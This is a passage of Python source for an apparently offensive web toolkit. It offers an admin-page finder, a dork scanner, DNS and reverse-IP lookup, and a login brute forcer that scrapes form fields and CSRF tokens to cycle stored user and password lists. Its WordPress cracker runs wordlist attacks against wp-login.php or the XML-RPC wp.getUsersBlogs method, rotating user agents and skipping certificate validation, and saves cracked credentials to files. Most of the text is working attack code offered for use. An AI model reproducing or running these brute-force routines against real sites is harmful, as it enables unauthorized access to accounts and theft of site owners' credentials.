                  removeDups(filetemp)
                  c = open("./.temp/" + filetemp, "r")
                  name = "./output/dorkscan/" + nm + ".txt"
                  content = c.read()
                  c.close()
                  os.remove(".temp/" + filetemp)
                  save_file(name, content, 2)
                else:
                  input(f"\n{fail}{BO} Nothing is Saved!")
            else:
              input(f'\n{fail}{BR} No Url Found, Nothing is Saved!')
            main()
          else:
            input(f"{error}{BR} Input Dork!") 
            self.main()
      else:           
         input(invalid)
         self.main()
    except Exception as e:
      input(BR+str(e))
      main()
    except KeyboardInterrupt:
      cancel()

#Admin Finder =====================================
class ADMF:

  def admf_func(self,mode):
    try:
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} Admin Finder {W}")

      if (mode == 1):
        filetemp = str(uuid.uuid4())
        s_url = str(
          input(f" └─[{O}Url [eg:https://www.google.com]:{P} "))
        if "http://" in s_url or "https://" in s_url:
          s_url = s_url
          n_url = urlparse(s_url).hostname
        else:
          n_url = s_url
          s_url = "http://" + s_url
        
        checkConnection(s_url,1)

        with open('./src/adminpages.txt', 'r') as f:
          adminpages = f.read().splitlines()
        print("\n")
        for adminpage in adminpages:
          try:
            try:
              response = requests.get(s_url + "/" + adminpage)
              if 'admin' in response.text or 'login' in response.text:
                sys.stdout.write("\r" + whitespace)
                sys.stdout.write(f"\r{loginfound}{BG} {s_url}/{adminpage}\n")
                text = "Url: {}\n".format(s_url + "/" + adminpage)
                temp = open("./.temp/" + filetemp, "a+")
                temp.writelines(text)
                temp.close()
              else:
                sys.stdout.write("\r" + whitespace)
                sys.stdout.write("\r"+ notfound + R +
                                 " " + s_url + "/" + adminpage)
            except requests.exceptions.ConnectionError:
              print(f"\n{ercon}{R} {s_url}/{adminpage}\n")
          except KeyboardInterrupt:
            if os.path.exists(".temp/" + filetemp):
              removeDups(filetemp)
              c = open("./.temp/" + filetemp, "r")
              name = "./output/adminfind/" + n_url + ".txt"
              content = c.read()
              c.close()
              os.remove(".temp/" + filetemp)
              save_file(name, content, 1)
            else:
              input(f"\n{fail}{BO} Nothing is Saved!")
              main()
            main()
          time.sleep(0.05)

        if os.path.exists(".temp/" + filetemp):
          removeDups(filetemp)
          c = open("./.temp/" + filetemp, "r")
          name = "./output/adminfind/" + n_url + ".txt"
          content = c.read()
          c.close()
          os.remove(".temp/" + filetemp)
          save_file(name, content, 1)
        else:
          input(f"\n{fail}{BO} Nothing is Saved!")
          main()
        main()

    except KeyboardInterrupt:
      cancel()


#Login Brute =====================================
class LOG:

  def process_request(self, request, user, password, failed_aftertry, url):
    filetemp = str(uuid.uuid4())
    if "http://" in url or "https://" in url:
      n_url = urlparse(url).hostname
    else:
      n_url = url

    if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
      if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
        print(f"\n{fail}{BR} Connection failed : Trying again ....")
        return
      else:
        failed_aftertry = failed_aftertry + 1
        print(f"\n{fail}{BR} Connection failed : 404 Not Found (Verify your url)")
    else:

      #print data.text
      if INCORRECT_MESSAGE[0] in request.text or INCORRECT_MESSAGE[
          1] in request.text:
        print(f"\n{fail}{BR} Failed to connect with:\n{BO}User: {P}{user}\n{BO}Pass: {P}{password}")
      else:
        if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[
            1] in request.text:

          sys.stdout.write("\r" + whitespace)
          sys.stdout.write(f"\r{found}{BG}Url: {url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}")

          text = "Url: {}\nUsername: {}\nPassword: {}\n".format(
            url, user, password)
          temp = open("./.temp/" + filetemp, "a+")
          temp.writelines(text)
          temp.close()

          if os.path.exists(".temp/" + filetemp):
            removeDups(filetemp)
            c = open("./.temp/" + filetemp, "r")
            name = "./output/logbrute/" + n_url + ".txt"
            content = c.read()
            c.close()
            os.remove(".temp/" + filetemp)
            save_file(name, content, 1)
          else:
            input(f"\n{fail}{BO} Nothing is Saved!")
            main()
          main()
        else:
          sys.stdout.write("\r" + whitespace)
          sys.stdout.write(f"\r{loading}{BB} Trying theese parameters:\n{BO}User: {P}{user}\n{BO}Pass: {P}{password}")

  def get_csrf_token(self, url, csrf_field):
    time_stamp = time.time()
    date_time = datetime.fromtimestamp(time_stamp)
    str_date_time = date_time.strftime(W+"["+BO+"%H:%M:%S"+W+"]")
    result = requests.get(url)
    tree = html.fromstring(result.text)
    sys.stdout.write("\r" + whitespace)
    sys.stdout.write(f"\r{rstr_date_time}{O} Trying to Fetch a token...")
    _token = ""
    try:
      _token = list(
        set(tree.xpath("//input[@name='" + csrf_field + "']/@value")))[0]
    except Exception as es:
      pass
    return _token

  def process_user(self, user,
                   url,
                   failed_aftertry,
                   user_field,
                   password_field,
                   csrf_field="_csrf"):
    for password in PASSWORDS:
      payload = {
        user_field: user.replace('\n', ''),
        password_field: password.replace('\n', ''),
        csrf_field: self.get_csrf_token(url, csrf_field)
      }
    print(success + BG, payload)
    request = requests.post(url, data=payload)
    self.process_request(request, user, password, failed_aftertry, url)

  def try_connection(self, url, user_field, password_field, csrf_field):
    print(f"{success}{G} Connecting to: {P}{url}\n")
    failed_aftertry = 0
    for user in USERS:
      self.process_user(user, url, failed_aftertry, user_field, password_field,
                       csrf_field)

  def manual_mode(self, ):
    print(f"{success}{BO} After inspecting the LOGIN <form />, please fill here :")
    
    url = str(
      input(f"{W} ├─[{O}Target Url ['action' attribute | eg:http://site.com/login-form.php]:{P} "))
    if "http" in url or "/" in url or "." in url:
      pass
    else:
      input(invalid)
      self.main()
    user_field = str(
      input(f"{W} ├─[{O}User Field ['name' attribute | eg:username]:{B} "))
    password_field = str(
      input(f"{W} ├─[{O}Password Field ['name' attribute | eg:password]:{P} "))
    print(f"{W} ├─[{printout}{P} Enter the csrf-token field  ['name' attribute | leave blank if this attribute is not present in the form]")
    csrf_field = str(input(f"{W} └─[{O}csrf-token :{P} "))

    checkConnection(url,1)

    self.try_connection(url, user_field, password_field, csrf_field)

  def extract_field_form(self, url, html_contain):
    print(f"{printout}{O} Starting extraction...")
    tree = html.fromstring(html_contain)

    print(f"{printout}{O} Fetching parameters..")
    form_action_url = list(tree.xpath("//form/@action"))[0]
    payload_fetched = list(set(tree.xpath("//form//input")))
    if len(form_action_url) == 0:
      form_action_url = url

    if "http" not in form_action_url:
      form_action_url = url + form_action_url

    print(success + B + " Action : ", form_action_url)
    fields = []
    for each_element in payload_fetched:
      names = each_element.xpath("//@name")
      types = each_element.xpath("//@type")

      for i, name in enumerate(names):
        if types[i] != "submit" and name != "submit":
          print(success + B + " ~>", str(name),
                "{" + str(types[i]) + "}")

        fields = names
        break

    if len(fields) == 2:
      fields.append("empty-token-field")

    self.try_connection(url, fields[0], fields[1], fields[2])

  def automatic_mode(self):
    url = str(
      input(f"{W} └─[{O}Url [eg:http://site.com/login/]:{P} "))

    checkConnection(url,1)

    if "http" in url or "/" in url or "." in url:
      r = requests.get(url)
    else:
      input(invalid)
      self.main()
      

    self.extract_field_form(url, r.text)

  def main(self):
    try:
      mode_banner = f"""{W}[{BR}@{W}]{BG} Login Brute {W}
 ╿
 ├┬─[{BR}1{W}]{BO} Auto Mode {W}
 │├─[{BR}2{W}]{BO} Manual Mode {W}
 │└─[{BR}3{W}]{BO} Back {W}
 │"""
      os.system(clrcmd)
      print(banner)
      print(mode_banner)

      mode = input(f" └─[{BR}~>{W}]{P} ")
      if (mode == '1' or mode == '01'):
        self.func(1, "Auto Mode")
      elif (mode == '2' or mode == '02'):
        self.func(2, "Manual Mode")
      elif (mode == '0' or mode == '00'):
        main()
      else:
        input(invalid)
        self.main()

    except KeyboardInterrupt:
      cancel()
        
  def func(self, slc, mode):
    os.system(clrcmd)
    print(banner)
    print(f"{W}[{BR}@{W}]{BG} Login Brute {BG}[{mode}]{W}")

    if slc == 1:
      self.automatic_mode()
    elif slc == 2:
      self.manual_mode()


#MARKER #WordPress Crack =====================================
class WP:

  def userAgentS(self):
    listAgent= open("./src/UserAgent.txt", "r")
    Agent = listAgent.read().splitlines()
    Ua = random.choice(Agent)
    return Ua

  def urlCMS(self, url,brutemode):
    if url[:8] != "https://" and url[:7] != "http://":
        print(f"\n{error}{BR} You must insert http:// or https:// procotol")
        self.main()
    # Page login
    if "https" in url:
        url = url.replace("https", "http" )

    if brutemode == "std":
      if "/wp-login.php" in url:
        url = url
      else:
        url = url+'/wp-login.php'
    else:
      if "/xmlrpc.php" in url:
        url = url
      else:
        url = url+'/xmlrpc.php'
    return url

  def bodyCMS(self, username,pwd,brutemode):
    if brutemode == "std":
       body = { 'log':username,
       'pwd':pwd,
       'wp-submit':'Login',
       'testcookie':'1' }
    else:
       body = """<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName>
         <params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (username, pwd)
    return body


  def headersCMS(self, Ua,lenbody,brutemode):
    if brutemode == "std":
       headers = { 'User-Agent': Ua,
                   'Content-type': 'application/x-www-form-urlencoded',
                   'Cookie': 'wordpress_test_cookie=WP+Cookie+check' }
    else:
       headers = { 'User-Agent': Ua,
                   'Content-type': 'text/xml',
                   'Content-Length': "%d" % len(lenbody)}
    return headers

  def responseCMS(self, response):
    if 'set-cookie' in response:
      if response['set-cookie'].split(" ")[-1] == "httponly":
        return "1"
    else:
      pass

  def connection(self, url,user,password,Ua,timeout,brutemode):

    username = user
    pwd = password
    n_url = urlparse(url).hostname
    http = httplib2.Http(timeout=timeout, disable_ssl_certificate_validation=True)

    # HTTP POST Data
    body = self.bodyCMS(username,pwd,brutemode)

    # Headers
    headers = self.headersCMS(Ua,body,brutemode)

    try:

        if brutemode == "std":
           response, content = http.request(url, 'POST', headers=headers, body=urllib.parse.urlencode(body))

           if str(response.status)[0] == "4" or str(response.status)[0] == "5":
              input(error + BR +' HTTP error, code: '+str(response.status))
              self.main()

           if self.responseCMS(response) == "1":

              print(f"\n{found}{BG}Password FOUND!!!{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}")
              text = "Url: {}\nUsername: {}\nPassword: {}\n".format(url, user, password)
              name = "./output/wpbrute/" + n_url + ".txt"
              save_file(name, text, 1)

           checkCon = "OK"
           return checkCon
        else:
           response, content = http.request(url, 'POST', headers=headers, body=body)

           if str(response.status)[0] == "4" or str(response.status)[0] == "5":
              input(error + BR +' HTTP error, code: '+str(response.status))
              self.main()

           # Remove all blank and newline chars
           xmlcontent = content.decode().replace(" ", "").replace("\n","")

           if not "faultCode" in xmlcontent:
              print(f"\n{found}{BG}Password FOUND!!!{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}")
              text = "Url: {}\nUsername: {}\nPassword: {}\n".format(url, user, password)
              name = "./output/wpbrute/" + n_url + ".txt"
              save_file(name, text, 1)

           checkCon = "OK"
           return checkCon
    except KeyboardInterrupt:
      cancel()
    except socket.timeout:
        input(f"{error}{BR} Connection Timeout")
        main()
    except socket.error:
        input(f"{error}{BR} Connection Refused")
        main()
    except httplib.ResponseNotReady:
        input(f"{error}{BR} Server Not Responding")
        main()
    except httplib2.ServerNotFoundError:
        input(f"{error}{BR} Server Not Found")
        main()
    except httplib2.HttpLib2Error:
        input(f"{error}{BR} Connection Error!!")
        main()


  def blocks(self, files, size=65536):
    while True:
        b = files.read(size)
        if not b: break
        yield b

  def main(self):
    try:
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} WordPress Crack {W}")
      opt = str(input(f"{W} ├─[{O}Brute Mode [1 standard | 2 xml-rpc | eg:1]:{P} "))
      url = str(input(f"{W} ├─[{O}Target Url [eg:http://site.com/wp-login.php]:{P} "))
      user = str(input(f"{W} ├─[{O}Username [eg:admin]:" +P + " "))
      wlfile = str(input(f"{W} ├─[{O}Wordlist [leave blank for default | eg:src/brute/password.txt]:{P} "))
      if wlfile == "" or wlfile == " ":
        wlfile = "./src/brute/passwords.txt"
      else:
        if not os.path.isfile(wlfile) and not os.access(wlfile, os.R_OK):
          input(f"{error}{BR} File Does Not Exists!")
          self.main()
        else:
          wlfile = wlfile

      timeout = input(f"{W} └─[{O}Response Timeout [eg:3]:{P} ")
      timeout = int(timeout)
      if opt == "1" or opt == "01":
        brtmd="std"
      else:
        brtmd="xml"

      # Gen Random UserAgent
      Ua  = self.userAgentS()
      # Url to url+login_cms_page
      url = self.urlCMS(url,brtmd)

      wlsize = os.path.getsize(wlfile) >>20
      if wlsize < 100:
        with open(wlfile) as f:
          totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
      else:
        totalwordlist="unknown"

      print(f"\n{succes}{BB} Target.....: {url}")
      print(success+BB+' Wordlist...: '+str(totalwordlist)+" ["+wlfile+"]")
      print(f"\n{succes}{BB} Username...: {user}")
      if brtmd == "std":
        print(f"\n{succes}{BB} BruteMode..: Standard")
      else:
        print(f"\n{succes}{BB} BruteMode..: Xml-Rpc")
        print(f"\n{succes}{BB} Connecting.......")

      if self.connection(url,user,Ua,Ua,timeout,brtmd) == "OK":
        print(f"\n{succes}{BB} Connection Established!")

      count = 0
      totalwordlist = str(totalwordlist)
      term = Terminal()
      #threads = []

      with open(wlfile) as wordlist:
        for pwd in wordlist:
          if self.connection(url,user,Ua,Ua,timeout,brtmd) == "OK":
            count += 1
            cnt = W+"["+BO+str(count)+'/'+totalwordlist+W+"]"
            self.connection(url,user,pwd,Ua,timeout,brtmd)
            #t = Thread(target=self.connection, args=(url,user,pwd,Ua,timeout,brtmd))
            #t.start()
            #threads.append(t)

            with term.location(x=0, y=25):
              try:
                with term.location(x=0, y=26):
                  print(whitespace)
                with term.location(x=0, y=26):
                  print(f"{cnt}{BO} User: {P}{user}{BO} Pass: {P}{pwd}")
              except KeyboardInterrupt:   
                with term.location(x=0, y=27):
                  cancel()

            sleep(0.150)
            count = int(count)
          else:
            input(f"\n{error}{BR} Check Your Internet Connection!")

      #for a in threads:
       # a.join()

      print(f"\n{error}{BR} Password NOT found :(")
    except KeyboardInterrupt:
      cancel()

#NSLookup =====================================
class nslookup:

  def ns_func(self, mode):
    try:
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} NSLookup {W}")
      if (mode == 1):
        filetemp = str(uuid.uuid4())
        types = [
          "A", "AAAA", "AFSDB", "ALIAS", "ATMA", "CAA", "CERT", "CNAME",
          "DHCID", "DNAME", "DNSKEY", "DS", "HINFO", "ISDN", "LOC",
          "MB, MG, MINFO, MR", "MX", "NAPTR", "NS", "NSAP", "NSEC", "NSEC3",
          "NSEC3PARAM", "PTR", "RP", "RRSIG", "RT", "SOA", "SRV", "TLSA",
          "TXT", "X25"
        ]
        f_url = str(input(f" └─[{O}Url [eg:google.com]:{P} "))

        if "http://" in f_url or "https://" in f_url:
          url = urlparse(f_url).hostname
          n_url = url
          url = str(url)
        else:
          url = f_url
          n_url = url

        checkConnection("https://"+url,1)

        for type in types:
          command = "nslookup -type=" + type + " " + url
          process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
          output, error = process.communicate()
          if (error):
            print(error)
          print(success + BG + " Types: " + type + "\n" +
                O + output.decode("utf=8"))
          time.sleep(0.05)

          text = "Types: {}\n{}\n".format(type, output.decode("utf=8"))
          temp = open("./.temp/" + filetemp, "a+")
          temp.writelines(text)
          temp.close()

        if os.path.exists(".temp/" + filetemp):
          removeDups(filetemp)
          c = open("./.temp/" + filetemp, "r")
          name = "./output/nslookup/" + n_url + ".txt"
          content = c.read()
          c.close()
          os.remove(".temp/" + filetemp)
          save_file(name, content, 1)
        else:
          input(f"\n{fail}{BO} Nothing is Saved!")
          main()
        main()

      elif (mode == 2):
        filetemp = str(uuid.uuid4())
        path = str(input(f" └─[{O}Path [eg:lists.txt]:{P} "))
        if not os.path.exists(path):
          input(f"{error}{BR} File Does Not Exists!")
          self.ns_func(mode)

        with open(path, 'r') as f:
          nslists = f.read().splitlines()
        print("\n")
        for nslist in nslists:

          types = [
            "A", "AAAA", "AFSDB", "ALIAS", "ATMA", "CAA", "CERT", "CNAME",
            "DHCID", "DNAME", "DNSKEY", "DS", "HINFO", "ISDN", "LOC",
            "MB, MG, MINFO, MR", "MX", "NAPTR", "NS", "NSAP", "NSEC", "NSEC3",
            "NSEC3PARAM", "PTR", "RP", "RRSIG", "RT", "SOA", "SRV", "TLSA",
            "TXT", "X25"
          ]
          f_url = nslist
          if "http://" in f_url or "https://" in f_url:
            url = urlparse(f_url).hostname
            n_url = url
            url = str(url)
          else:
            url = f_url
            n_url = url

          checkConnection("https://"+url,0)

          for type in types:
            command = "nslookup -type=" + type + " " + url
            process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
            output, error = process.communicate()
            if (error):
              print(error)

            print(success + BG + " Types: " + type +
                  "\n" + O + output.decode("utf=8"))
            time.sleep(0.05)

            text = "Types: {}\n{}\n".format(type, output.decode("utf=8"))
            temp = open("./.temp/" + filetemp, "a+")
            temp.writelines(text)
            temp.close()

          if os.path.exists(".temp/" + filetemp):
            removeDups(filetemp)
            c = open("./.temp/" + filetemp, "r")
            name = "./output/nslookup/" + n_url + ".txt"
            content = c.read()
            c.close()
            os.remove(".temp/" + filetemp)
            save_file(name, content, 2)
            time.sleep(3)
          else:
            input(f"\n{fail}{BO} Nothing is Saved!")
            main()
        main()
    except KeyboardInterrupt:
      cancel()

#Reverse IP Lookup =====================================
class REVIP:
    def __init__(self,):
        try:
            os.system(clrcmd)
            mode_banner = f"""{W}[{BR}@{W}]{BG} Reverse IP Lookup {W}
 ╿
 ├┬─[{BR}1{W}]{BO} Domain {W}
 │├─[{BR}2{W}]{BO} IP Address {W}
 │├─[{BR}3{W}]{BO} File List {W}
 │└─[{BR}0{W}]{BO} Back {W}
 │"""
            print(banner)
            print(mode_banner)

            mode = input(f" └─[{BR}~>{W}]{P} ")
            if (mode == '1' or mode == '01'):
              self.main(1)
            elif (mode == '2' or mode == '02'):
              self.main(2)
            elif (mode == '3' or mode == '03'):
              self.main(3)
            elif (mode == '0' or mode == '00'):
               main()
            else:
               input(invalid)
               REVIP()

        except KeyboardInterrupt:
            cancel()

    def main(self,mode):
        os.system(clrcmd)
        print(banner)
        print(f"{W}[{BR}@{W}]{BG} Reverse IP Lookup {W}") 
        
        if mode == 1:
          inp = str(input(f" └─[{O}Domain Target [eg:localhost.com]:{P} "))
          if inp.isspace():
            input(invalid)
            REVIP()
          elif "http://" in inp or "https://" in inp or "/" in inp:
            dom = urlparse(inp).hostname
            n_url = dom
            dom = str(dom)
          else:
            dom = inp
            n_url = dom

          checkConnection(dom,1)

          self.reverseIPlookup(dom, n_url)

        elif mode == 2:
          inp = str(input(f" └─[{O}IP Target [eg:192.168.1.1]:{P} "))
          if inp.isspace():
            input(invalid)
            REVIP()
          else:
            ip = inp
            n_url = inp
            checkConnection(ip,1)
            if ipCategorizer(ip):
               if ipCategorizer(ip)[0] == 1 or ipCategorizer(ip)[0] == 3:
                  if ipCategorizer(ip)[0] == 1:
                      self.reverseIPlookup(ip, n_url)
               else:
                 input (f"{error}{R} Private IP/IP range detected")

        elif mode == 3:
          inp = str(input(f" └─[{O}File List [eg:path/list.txt]:{P} "))
          if inp.isspace():
            input(invalid)
            REVIP()
          elif not os.path.exists(inp):
            input(f"{error}{BR} File Does Not Exists!")
            REVIP()
          else:
            ip_file = inp
            n_url = os.path.splitext(inp)[0]
            try:
              ip_file = open(ip_file, 'rb').readlines()
              for ip in ip_file:

                if "http://" in ip or "https://" in ip or "/" in ip:
                    ip = urlparse(ip).hostname
                else:
                    pass
        
                ip = ip.decode('utf-8').rstrip()
                checkConnection(ip,1)
                if ipCategorizer(ip):
                  if ipCategorizer(ip)[0] == 1 or ipCategorizer(ip)[0] == 3:
                      if ipCategorizer(ip)[0] == 1:
                          self.reverseIPlookup(ip, n_url)
                      else:
                          for ip in list(str(i) for i in ipaddress.ip_network(ip).hosts()):
                              self.reverseIPlookup(ip, n_url) 
                  else:
                      input (error +R+ " Private IP/IP range ({}) detected".format(ip))
                              

            except IOError as e:
              input(error +R+ str(e).split("] ")[1])
              REVIP()


    def reverseIPlookup(self, ip, n_url):
        filetemp = str(uuid.uuid4())
        print('\r' + loading + BO + "Searching a record for " + BB + ip + ' ' * 10, end='\r')
        url = "https://api.hackertarget.com/reverseiplookup/?q=" + ip
        try:
            req = requests.get(url)
            if "No DNS" not in req.text:
                print('\r' + success +BG+ "Found a record for " + ip + ' ' * 20)
                for i in re.split('\n', req.text):
                    if ip not in i and i.strip():
                        print (success +BB+ i)
                        text = "{}\n".format(i)
                        temp = open("./.temp/" + filetemp, "a+")
                        temp.writelines(text)
                        temp.close()

            if os.path.exists(".temp/" + filetemp):
              removeDups(filetemp)
              c = open("./.temp/" + filetemp, "r")
              name = "./output/revIP/" + n_url + ".txt"
              content = c.read()
              c.close()
              os.remove(".temp/" + filetemp)
              save_file(name, content, 1)
            else:
              input(f"\n{fail}{BO} Nothing is Saved!")
              main()
            main()

        except requests.exceptions.RequestException as e:
            input(f"{error}{BR} Something going wrong with the connection.Please check the connectivity")
        except KeyboardInterrupt:
            if os.path.exists(".temp/" + filetemp):
              removeDups(filetemp)
              c = open("./.temp/" + filetemp, "r")
              name = "./output/revIP/" + n_url + ".txt"
              content = c.read()
              c.close()
              os.remove(".temp/" + filetemp)
              save_file(name, content, 1)
            else:
              input(f"\n{fail}{BO} Nothing is Saved!")
              main()
            main()
            
#Mode =====================================
class mode:

  def slc(self, classs, deff , name):
    self.deff = deff
    self.classs = classs
    try:
      mode_banner = f"""{W}[{BR}@{W}]{BG} {name}{W}
 ╿
 ├┬─[{BR}1{W}]{BO} Single Target {W}
 │├─[{BR}2{W}]{BO} Multi Target {W}
 │└─[{BR}0{W}]{BO} Back {W}
 │"""

      os.system(clrcmd)
      print(banner)
      print(mode_banner)

      md = str(input(f" └─[{BR}~>{W}]{P} "))
      if (md == '1' or md == '01'):
          os.system(clrcmd)
          self.classs.self.deff(1)

      elif (md == '2' or md == '02'):
        os.system(clrcmd)
        self.classs.self.deff(1)

      elif (md == '0' or md == '00'):
        main()

      else:
        input(invalid)
        self.slc(classs, deff, name)

    except KeyboardInterrupt:
      cancel()


#Main =====================================
def main():
  try:
    time_stamp = time.time()
    date_time = datetime.fromtimestamp(time_stamp)
    str_date_time = date_time.strftime("%d-%m-%Y " + W + "|" + BR +
                                       " %H:%M:%S")
    os.system(clrcmd)

    menu_banner = f"""{W} ╿
 ├┬─[{BR}1{W}]{BO} Web Crawler       {W}┬[{BR}${W}]{PINK} Scanner Tools{W}
 │├─[{BR}2{W}]{BO} Subdomain Scanner {W}│{W}
 │├─[{BR}3{W}]{BO} Dork Scanner      {W}│{W}
 │├─[{BR}4{W}]{BO} Admin Finder      {W}┘{W}
 │├─[{BR}5{W}]{BO} Login Brute       {W}┬[{BR}${W}]{PINK} Brute Force Tools{W}
 │├─[{BR}6{W}]{BO} WordPress Crack   {W}┘{W}
 │├─[{BR}7{W}]{BO} NSLookup          {W}┬[{BR}${W}]{PINK} Network Tools{W}
 │├─[{BR}8{W}]{BO} Reverse IP        {W}┘{W}
 │├─[{BR}9{W}]{BO} Credits           {W}┬[{BR}${W}]{PINK} About{W}
 │└─[{BR}0{W}]{BO} Exit              {W}┘{W}
 │"""
    #print(N+"N"+W+"W"+R+"R"+G+"G"+O+"O"+BL+"BL"+B+"B"+BR+"BR"+U+"U")
    print(banner)
    print(f"{systm}{BG} Welcome Expl0iter!{W}  [{BR}{str_date_time}{W}]")
    print(menu_banner)

    while True:
      i = str(input(f" └─[{BR}~>{W}]{P} "))
      if (i == '1' or i == '01'):
        os.system(clrcmd)
        mode().slc("crawler()", "crawl_func", "Web Crawler")
        break
      elif (i == '2' or i == '02'):
        os.system(clrcmd)
        SUB().sub_func(1)
        break
      elif (i == '3' or i == '03'):
        os.system(clrcmd)
        dorkscan().main()
        break
      elif (i == '4' or i == '04'):
        os.system(clrcmd)
        ADMF().admf_func(1)
        break
      elif (i == '5' or i == '05'):
        os.system(clrcmd)
        LOG().main()
        break
      elif (i == '6' or i == '06'):
        os.system(clrcmd)
        WP().main()
        break
      elif (i == '7' or i == '07'):
        os.system(clrcmd)
        mode().slc("nslookup()", "ns_func", "NSLookup")
        break
      elif (i == '8' or i == '08'):
        os.system(clrcmd)
        REVIP()
        break
      elif (i == '9' or i == '09'):
        os.system(clrcmd)
        credits()
        break
      elif (i == '0' or i == '00'):
        exit()
      else:
        input(invalid)
        main()
        continue
  except KeyboardInterrupt:
    exit()

def credits():
    os.system(clrcmd)
    print(banner)
    print(f"{W}[{BR}@{W}]{BG} Credits To: {W} \n")

    print(f"{W}[{BR}+{W}]{P} Web Crawler & Subdomain Scanner")
    print(f"{W} ├─[{BO}+{W}]{BG} Author:{BO} codassassin")
    print(f"{W} ├─[{PINK}+{W}]{BG} Recode: {PINK}{author}")
    print(f"{W} └─[{BB}+{W}]{BG} Github:{BB} https://github.com/codassassin/web-crawler-v2.0")
    print("\n")

    print(f"{W}[{BR}+{W}]{P} Dork Scanner")
    print(f"{W} ├─[{BO}+{W}]{BG} Author:{BO} jaxBCD")
    print(f"{W} ├─[{PINK}+{W}]{BG} Recode: {PINK}{author}")
    print(f"{W} └─[{BB}+{W}]{BG} Github:{BB} https://github.com/jaxBCD/Ultimate-Dork")
    print("\n")
    
    print(f"{W}[{BR}+{W}]{P} Admin Finder")
    print(f"{W} ├─[{BO}+{W}]{BG} Author: {BO}{author}")
    print(f"{W} ├─[{PINK}+{W}]{BG} Recode: {PINK}{author}")
    print(f"{W} └─[{BB}+{W}]{BG} Github: {BB}{git}")
    print("\n")
    
    print(f"{W}[{BR}+{W}]{P} Login Brute")
    print(f"{W} ├─[{BO}+{W}]{BG} Author:{BO} Sanix-darker")
    print(f"{W} ├─[{PINK}+{W}]{BG} Recode: {PINK}{author}")
    print(f"{W} └─[{BB}+{W}]{BG} Github:{BB} https://github.com/Sanix-Darker/Brute-Force-Login")
    print("\n")

    print(f"{W}[{BR}+{W}]{P} WordPress Crack")
    print(f"{W} ├─[{BO}+{W}]{BG} Author:{BO} Claudio Viviani")
    print(f"{W} ├─[{PINK}+{W}]{BG} Recode: {PINK}{author}")
    print(f"{W} └─[{BB}+{W}]{BG} Github:{BB} https://github.com/claudioviviani/wordbrutepress")
    print("\n")
    
    print(f"{W}[{BR}+{W}]{P} NSLookup")
    print(f"{W} ├─[{BO}+{W}]{BG} Author:{BO} JamesJ0717")
    print(f"{W} ├─[{PINK}+{W}]{BG} Recode: {PINK}{author}")
    print(f"{W} └─[{BB}+{W}]{BG} Github:{BB} https://github.com/JamesJ0717/nslookup-python")
    print("\n")

    print(f"{W}[{BR}+{W}]{P} Reverse IP")
    print(f"{W} ├─[{BO}+{W}]{BG} Author:{BO} 1uffyD9")
    print(f"{W} ├─[{PINK}+{W}]{BG} Recode: {PINK}{author}")
    print(f"{W} └─[{BB}+{W}]{BG} Github:{BB} https://github.com/1uffyD9/revIPLookup")
    print("\n")
    
    input(O+"Press Anything To Back To Menu")
    main()
    

def cancel():
  sys.stdout.write("\n\r" + whitespace)
  sys.stdout.write(W + "\r[" + BR + "\\" + W + "]" + O + " Back To Menu [3]")
  time.sleep(0.7)
  sys.stdout.write(W + "\r[" + BR + "|" + W + "]" + O + " Back To Menu [2]")
  time.sleep(0.7)
  sys.stdout.write(W + "\r[" + BR + "/" + W + "]" + O + " Back To Menu [1]")
  time.sleep(0.7)
  main()


def exit():
  os.system(clrcmd)
  print(banner)
  print(W + "[" + BR + "$" + W + "]" + O + " See You Again!\n\n")
  sys.exit()

if __name__ == '__main__':                                          
  main()

""" template
class name:
    def name_func(mode):
        try:
            os.system(clrcmd)
            print(banner)
            print("\033[0;0m[\033[1;31m@\033[0;0m] \033[1;32mName \033[0;0m")
            if(mode == 1):
                filetemp = str(uuid.uuid4())
                
                f_url = str(input(" └─["+BO+"Url [eg:google.com]:"+BB+" "))
                
                if "http://" in f_url or "https://" in f_url:
                    url = urlparse(f_url).hostname
                    n_url = url
                    url = str(url)
                else:
                    url = f_url
                    n_url = url
                    
                filetemp = str(uuid.uuid4())
                text = "Types: {}\n{}\n".format(type, output.decode("utf=8"))
                temp = open("./.temp/"+filetemp, "a")
                temp.writelines(text)
                temp.close()
                    
                c = open("./.temp/"+filetemp, "r")
                name = "output/path/" + n_url + ".txt"
                content = c.read()
                c.close()
                os.remove(".temp/"+filetemp)
                save_file(name,content,1)
                main()
                
            elif(mode == 2):
                filetemp = str(uuid.uuid4())
                path = str(input(" └─["+BO+"Path [eg:lists.txt]:"+BG+" "))
                if not os.path.exists(path):
                    input(W+"   ["+BR+"!"+W+"]"+BR+" File Does Not Exists!")
                    nslookup.ns_func(mode)
                    
                with open(path, 'r') as f:
                    lists = f.read().splitlines()
                    
                for list in lists:
                    
                    if "http://" in f_url or "https://" in f_url:
                        url = urlparse(f_url).hostname
                        n_url = url
                        url = str(url)
                    else:
                        url = f_url
                        n_url = url
                        
                    text = "Types: {}\n{}\n".format(type, output.decode("utf=8"))
                    temp = open("./.temp/"+filetemp, "a")
                    temp.writelines(text)
                    temp.close()
                    
                    c = open("./.temp/"+filetemp, "r")
                    name = "output/path/" + n_url + ".txt"
                    content = c.read()
                    c.close()
                    os.remove(".temp/"+filetemp)
                    save_file(name,content,2)
                    time.sleep(3)
                main()
        except KeyboardInterrupt:
            cancel()
"""
